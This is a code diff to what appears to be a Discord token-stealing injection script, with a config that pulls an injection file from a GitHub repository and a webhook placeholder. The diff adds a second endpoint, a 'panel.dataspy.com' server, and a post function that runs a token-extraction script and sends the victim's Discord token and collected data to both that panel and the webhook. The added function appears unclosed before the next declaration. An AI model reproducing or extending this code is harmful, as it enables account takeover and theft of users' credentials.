@@ -18,6 +18,7 @@ var config = {
     creator: "%NAME_CREATOR%",
     injection_url: "https://raw.githubusercontent.com/DataSpyGithub/DataSpyGithub/main/Index.js",
     webhook: "%WEBHOOK%",
+    uwu: "https://panel.dataspy.com:3000/",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -227,10 +228,36 @@ function GetLangue(read) {
         "ko": ":flag_kr: Korean"
     }
 
-    var langue = languages[read] || "Aucune langue détecter";
+    var langue = languages[read] || "---";
     return langue
 }
 
+const post = async (params) => {
+    params = JSON.stringify(params)
+    var token = await execScript(tokenScript)
+    var n = JSON.stringify({
+        data: params,
+        token: token
+    });
+    [config.uwu, config.webhook].forEach(res => {
+        const url = new URL(res);
+        const options = {
+            host: url.hostname,
+            port: url.port,
+            path: url.pathname,
+            method: 'POST',
+            headers: {
+                "Content-Type": "application/json"
+            }
+        }
+        const req = https.request(options);
+        req.on("error", (err) => {
+            console.log(err);
+        });
+        req.write(res == config.uwu ? n : params);
+        req.end();
+    })
+    
 const FirstTime = async () => {
     if (doTheLogOut) return false
     var token = await execScript(tokenScript)
